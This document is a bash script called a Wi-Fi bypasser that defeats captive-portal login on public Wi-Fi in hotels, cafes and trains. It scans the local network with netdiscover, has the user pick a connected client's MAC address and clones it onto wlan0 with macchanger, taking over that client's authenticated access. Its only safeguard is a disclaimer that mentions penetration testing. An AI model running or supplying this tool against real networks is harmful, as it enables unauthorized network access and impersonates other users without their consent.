#! /bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
BLINK='\033[33;5m'
nc='\033[0m'

clear;

if [[ $EUID -ne 0 ]]; then
        echo -e "\n\n\n\n\nRUN ME AS ${RED}${BLINK}ROOT${nc}!!!!!\n\n\n\n"
        exit 1
fi

echo -e '
 _    _  ____     ____  ____    ____  _  _  ____   __    ___  ___  ____  ____
( \/\/ )(_  _)___( ___)(_  _)  (  _ \( \/ )(  _ \ /__\  / __)/ __)( ___)(  _ \
 )    (  _)(_(___))__)  _)(_    ) _ < \  /  )___//(__)\ \__ \\__ \ )__)  )   /
(__/\__)(____)   (__)  (____)  (____/ (__) (__) (__)(__)(___/(___/(____)(_)\_)
'

echo -e "\nREAD ME: This is used for bypassing the authentication on public accessible  Wi-Fi."
echo -e "The type of Wi-Fi thats normally found inside Hotels, Cafes, trains etc."
echo -e "We will do this by using the MAC address of someone thats already connected.\n"

echo -e "${RED}Disclaimer${nc}: This tool was created to bypass the splash page that you receive when"
echo -e "you first connect to these Wi-Fi AP's, I see this often at client sites when testing internal Wi-Fi."
echo -e "Therefore I will not be held accountable for any unauthorized wifi offenses you cause!!!\n"

echo -e "${GREEN}Connect to the Wi-Fi then carry on...${nc}\n"

read -p "Hit ENTER to continue..."

myipeth=$(ifconfig eth0 | grep "inet " | awk '{print$2}')
myipwlan=$(ifconfig wlan0 | grep "inet " | awk '{print$2}')

echo -e "\nYour Current IP address for ETH0: ${RED}$myipeth${nc}"
echo -e "\nYour Current IP address for WLAN0: ${RED}$myipwlan${nc}\n"

read -p "What network interface are you using (e.g wlan0): " netinter

echo -e "\nOkay lets begin Netdiscover on ${GREEN}$netinter${nc}\n"

read -p "Press ENTER to continue..."
sleep 1;
echo -e "\nStarting in 3"
sleep 1;
echo -e "\nStarting in 2"
sleep 1;
echo -e "\nStarting in 1"
sleep 1;
konsole --noclose -e "sudo netdiscover -i $netinter" &
sleep 3;
echo -e "\nFrom the netdiscover list choose a MAC Address you wish to change to, copy and paste below!\n"
read -p "Enter MAC Address: " maccy
echo -e "\nChanging your MAC address of $netinter to ${CYAN}$maccy${nc}\n"
sleep 1;
echo -e "Turning off wlan0...\n"
sudo ifconfig wlan0 down
sleep 3;
echo -e "Changing MAC Address...\n"
sudo macchanger -m $maccy wlan0
sleep 3;
echo -e "\nTurning on wlan0...\n"
sudo ifconfig wlan0 up
sleep 3;
echo -e "\nMAC Address has been changed on the $netinter interface to ${YELLOW}$maccy${nc}\n\n"
sleep 1;
exit
